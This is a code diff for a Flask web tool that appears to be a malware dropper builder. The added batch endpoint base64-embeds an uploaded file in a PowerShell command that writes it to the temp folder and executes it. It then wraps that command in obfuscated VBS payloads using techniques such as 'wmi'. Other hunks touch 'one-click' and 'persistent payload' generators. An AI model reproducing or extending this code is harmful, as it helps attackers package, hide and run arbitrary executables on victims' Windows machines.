@@ -447,24 +447,56 @@ def batch_generate():
     data = request.json
     file_id = data.get('file_id')
     techniques = data.get('techniques', ['base64', 'wmi'])
+    obfuscation = data.get('obfuscation', 'high')
     fingerprint_id = data.get('fingerprint_id')
 
     if not file_id:
         return jsonify({'error': 'File ID required'}), 400
 
     try:
+        # Find uploaded file
+        uploaded_file = _find_uploaded_file(file_id)
+
+        if not uploaded_file or not os.path.exists(uploaded_file):
+            return jsonify({'error': 'File not found'}), 404
+
+        # Read file and build the command (same logic as generate-payload)
+        with open(uploaded_file, 'rb') as f:
+            file_content = f.read()
+
+        if fingerprint_id:
+            file_content = fingerprint_mgr.apply_fingerprint(
+                file_content, fingerprint_id, None
+            )
+
+        encoded_file = base64.b64encode(file_content).decode()
+        filename = os.path.basename(uploaded_file)
+        cmd = (
+            f'powershell -NoProfile -Command '
+            f'"$f=\'$env:temp\\\\{filename}\'; '
+            f'[System.IO.File]::WriteAllBytes($f, '
+            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
+            f'& $f"'
+        )
+
         results = {}
         for technique in techniques:
-            payload = payload_gen.generate("test", technique, "high")
+            payload = payload_gen.generate(cmd, technique, obfuscation)
             output_id = str(uuid.uuid4())[:8]
+            output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_payload.vbs")
+            with open(output_path, 'w') as f:
+                f.write(payload)
             results[technique] = {
                 'output_id': output_id,
                 'size': len(payload)
             }
 
         return jsonify({'success': True, 'results': results})
+    except ValueError as e:
+        return jsonify({'error': str(e)}), 400
     except Exception as e:
-        return jsonify({'error': f'Batch generation failed: {str(e)}'}), 500
+        logger.exception('Batch generation failed')
+        return jsonify({'error': _safe_error_message('Batch generation failed', e)}), 500
 
 
 @app.route('/api/generate-one-click', methods=['POST'])
@@ -480,11 +512,7 @@ def generate_one_click():
 
     try:
         # Find uploaded file
-        uploaded_file = None
-        for f in os.listdir(app.config['UPLOAD_FOLDER']):
-            if f.startswith(file_id):
-                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
-                break
+        uploaded_file = _find_uploaded_file(file_id)
 
         if not uploaded_file or not os.path.exists(uploaded_file):
             return jsonify({'error': 'File not found'}), 404
@@ -525,8 +553,11 @@ def generate_one_click():
             'file_type': file_type
         })
 
+    except ValueError as e:
+        return jsonify({'error': str(e)}), 400
     except Exception as e:
-        return jsonify({'error': f'One-click generation failed: {str(e)}'}), 500
+        logger.exception('One-click generation failed')
+        return jsonify({'error': _safe_error_message('One-click generation failed', e)}), 500
 
 
 @app.route('/api/one-click-styles', methods=['GET'])
@@ -637,11 +668,7 @@ def generate_persistent_payload():
 
     try:
         # Find uploaded file
-        uploaded_file = None
-        for f in os.listdir(app.config['UPLOAD_FOLDER']):
-            if f.startswith(file_id):
-                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
-                break
+        uploaded_file = _find_uploaded_file(file_id)
 
         if not uploaded_file or not os.path.exists(uploaded_file):
             return jsonify({'error': 'File not found'}), 404
@@ -651,7 +678,6 @@ def generate_persistent_payload():
             file_content = f.read()
 
         # Convert to base64 for embedding in command
-        import base64
         encoded_file = base64.b64encode(file_content).decode()
 
         # Generate command that will decode and execute the file
@@ -694,9 +720,15 @@ def generate_persistent_payload():
             'timestamp': datetime.now().isoformat()
         })
 
+    except ValueError as e:
+        return jsonify({'error': str(e)}), 400
     except Exception as e:
-        return jsonify({'error': f'Persistent payload generation failed: {str(e)}'}), 500
+        logger.exception('Persistent payload generation failed')
+        return jsonify({'error': _safe_error_message('Persistent payload generation failed', e)}), 500
 
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    debug_mode = os.environ.get('FLASK_DEBUG', 'false').lower() in ('true', '1', 'yes')
+    host = os.environ.get('FLASK_HOST', '0.0.0.0')
+    port = int(os.environ.get('FLASK_PORT', '5000'))
+    app.run(debug=debug_mode, host=host, port=port)
